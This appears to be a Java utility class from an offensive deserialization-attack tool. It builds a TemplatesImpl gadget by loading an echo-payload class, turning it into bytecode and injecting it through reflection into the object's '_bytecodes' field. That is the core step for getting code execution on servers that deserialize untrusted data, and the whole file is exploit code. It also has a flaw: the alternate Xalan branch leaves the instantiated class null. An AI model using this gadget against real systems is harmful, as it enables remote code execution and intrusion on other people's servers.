package com.summersec.attack.deser.util;

import com.summersec.attack.deser.echo.EchoPayload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Gadgetsplugin
{
    public static <T> T createTemplatesImpl(String classname) throws Exception {
        Class<TemplatesImpl> clazz1 = null;
        Class<T> tplClass = null;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = (Class)Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        } else {
            clazz1 = TemplatesImpl.class;
        }


        Class<?> clazz = EchoPayload.Utils.getPayloadClass(classname);

        T templates = (T)clazz1.newInstance();
        byte[] classBytes = ClassFiles.classAsBytes(clazz);

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes });



        Reflections.setFieldValue(templates, "_name", "Doge");
        return templates;
    }
}



